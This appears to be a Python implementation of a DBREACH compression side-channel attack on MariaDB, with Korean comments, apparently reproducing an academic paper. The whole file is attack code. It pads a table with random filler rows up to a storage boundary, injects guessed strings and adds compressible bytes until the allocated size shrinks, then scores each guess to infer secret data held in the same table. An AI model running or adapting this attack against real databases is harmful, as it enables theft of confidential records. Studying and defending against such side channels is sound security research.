# /app/dbreacher_impl.py
import os
import utils.mariadb_utils as utils
import dbreacher
import random

LOG_FULL = os.getenv("DBREACH_LOG_FULL", "1") != "0"

def _say(msg: str):
    # 풀 로그 기본 ON
    print(msg)

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller: utils.MariaDBController, tablename: str, startIdx: int, maxRowSize: int, fillerCharSet, compressCharAscii: int):
        if isinstance(fillerCharSet, set):
            fillerCharSet = list(fillerCharSet)
        super().__init__(controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.rowsAdded = 0
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False

        _say(f"[INIT] compressChar='{self.compressChar}', fillers={len(self.fillers)} rows, startIdx={self.startIdx}, maxRowSize={self.maxRowSize}")

    def _comp(self, n: int) -> str:
        return self.compressChar * n

    def reinsertFillers(self) -> bool:
        self.compressibilityScoreReady = False
        if self.fillersInserted:
            _say("[REINSERT] begin")
            # 최근에 부풀린 영역 되돌리기
            upto = self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)
            for row in range(self.startIdx, upto):
                s = self._comp(200)
                _say(f"[REINSERT] UPDATE row={row} -> '{s}'")
                self.control.update_row(self.table, row, s)
            self.control.flush_and_wait(self.table)

            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                _say(f"[REINSERT] DELETE row={row}")
                self.control.delete_row(self.table, row)
            self.control.flush_and_wait(self.table)

            self.bytesShrunkForCurrentGuess = 0
            self.fillers = [
                ''.join(self.rng.choices(self.fillerCharSet, k=self.maxRowSize))
                for _ in range(self.numFillerRows)
            ]
            _say(f"[REINSERT] regenerated fillers={len(self.fillers)}")
        else:
            _say("[REINSERT] first-time setup (no previous fillers)")
        return self.insertFillers()

    def insertFillers(self) -> bool:
        self.fillersInserted = True
        oldSize = self.control.get_table_size_alloc(self.table)
        _say(f"[FILLER] old_alloc={oldSize}")

        if not self.fillers:
            _say("[FILLER] ERROR: fillers empty")
            return False

        # 첫 filler (랜덤 200B)
        _say(f"[FILLER] INSERT row={self.startIdx} val='{self.fillers[0]}'")
        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        self.control.flush_and_wait(self.table)
        self.rowsAdded = 1
        newSize = self.control.get_table_size_alloc(self.table)
        _say(f"[FILLER] after first insert alloc={newSize}")

        if newSize > oldSize:
            _say("[FILLER] grew too quickly -> abort")
            return False

        # ⚠️ 경계 탐색은 '순수 랜덤 200B'로 채워 압축 효율을 낮춰서 파일 증가를 빠르게 유도
        i = 1
        while newSize <= oldSize:
            if i >= len(self.fillers):
                _say(f"[FILLER] ERROR: not enough fillers (need {i+1}, have {len(self.fillers)})")
                return False
            rowid = self.startIdx + i
            combined = self.fillers[i]  # ← 순수 랜덤 200B (논문: 행 길이 200B 유지)
            _say(f"[FILLER] INSERT row={rowid} val='{combined}'")
            self.control.insert_row(self.table, rowid, combined)
            self.control.flush_and_wait(self.table)
            newSize = self.control.get_table_size_alloc(self.table)
            _say(f"[FILLER] alloc now={newSize}")
            i += 1
            self.rowsAdded += 1

        self.rowsChanged = [False, False, False, False]
        _say(f"[FILLER] boundary reached, rowsAdded={self.rowsAdded}")
        return True

    def insertGuessAndCheckIfShrunk(self, guess: str) -> bool:
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0

        if self.rowsChanged[0]:
            _say(f"[GUESS] reset row={self.startIdx} -> '{self.fillers[0]}'")
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            self.rowsChanged[0] = False

        compression_bootstrapper = self._comp(100)
        for i in range(1, 4):
            if self.rowsChanged[i]:
                row_to_reset = self.startIdx + self.rowsAdded - i
                filler = self.fillers[self.rowsAdded - i]
                reset_str = compression_bootstrapper + filler[100:]
                _say(f"[GUESS] reset row={row_to_reset} -> '{reset_str}'")
                self.control.update_row(self.table, row_to_reset, reset_str)
                self.rowsChanged[i] = False

        self.control.flush_and_wait(self.table)
        old_size = self.control.get_table_size_alloc(self.table)

        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            _say(
                f"[GUESS] UPDATE row={self.startIdx}\n"
                f"  guess='{guess}'\n"
                f"  before='{self.fillers[0]}'\n"
                f"  after ='{new_first_row}'"
            )
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.rowsChanged[0] = True

        self.control.flush_and_wait(self.table)
        new_size = self.control.get_table_size_alloc(self.table)
        _say(f"[GUESS] alloc {old_size} -> {new_size}")
        return new_size < old_size

    def getSNoReferenceScore(self, length: int, charSet) -> float:
        seq = charSet if isinstance(charSet, (list, str, tuple)) else list(charSet)
        refGuess = ''.join(self.rng.choices(seq, k=length))
        _say(f"[REF:NO] L={length} refGuess='{refGuess}'")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of NO-ref guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def getSYesReferenceScore(self, length: int) -> float:
        refGuess = self.fillers[1][100:][:length]
        _say(f"[REF:YES] L={length} refGuess='{refGuess}' (from fillers[1][100:])")
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of YES-ref guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk()
        return self.getBytesShrunkForCurrentGuess()

    def addCompressibleByteAndCheckIfShrunk(self) -> bool:
        old_size = self.control.get_table_size_alloc(self.table)
        self.bytesShrunkForCurrentGuess += 1
        b = self.bytesShrunkForCurrentGuess

        if b <= 100:
            comp = self._comp(100 + b)
            row = self.startIdx + self.rowsAdded - 1
            newval = comp + self.fillers[self.rowsAdded - 1][len(comp):]
            _say(f"[AMP] +1B (phase1) row={row} val='{newval}'")
            self.control.update_row(self.table, row, newval)
            self.rowsChanged[1] = True
        elif b <= 200:
            comp = self._comp(b)
            row = self.startIdx + self.rowsAdded - 2
            newval = comp + self.fillers[self.rowsAdded - 2][len(comp):]
            _say(f"[AMP] +1B (phase2) row={row} val='{newval}'")
            self.control.update_row(self.table, row, newval)
            self.rowsChanged[2] = True
        elif b <= 300:
            comp = self._comp(b - 100)
            row = self.startIdx + self.rowsAdded - 3
            newval = comp + self.fillers[self.rowsAdded - 3][len(comp):]
            _say(f"[AMP] +1B (phase3) row={row} val='{newval}'")
            self.control.update_row(self.table, row, newval)
            self.rowsChanged[3] = True
        else:
            _say("[AMP] cap reached (b>300)")
            raise RuntimeError("Amplification cap reached")

        self.control.flush_and_wait(self.table)
        new_size = self.control.get_table_size_alloc(self.table)
        _say(f"[AMP] alloc {old_size} -> {new_size}")

        if new_size < old_size:
            self.compressibilityScoreReady = True
            _say(f"[AMP] SHRUNK! bytesShrunkForCurrentGuess={self.bytesShrunkForCurrentGuess}")
            return True
        return False

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            return 1.0 / float(self.bytesShrunkForCurrentGuess)
        return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        return None
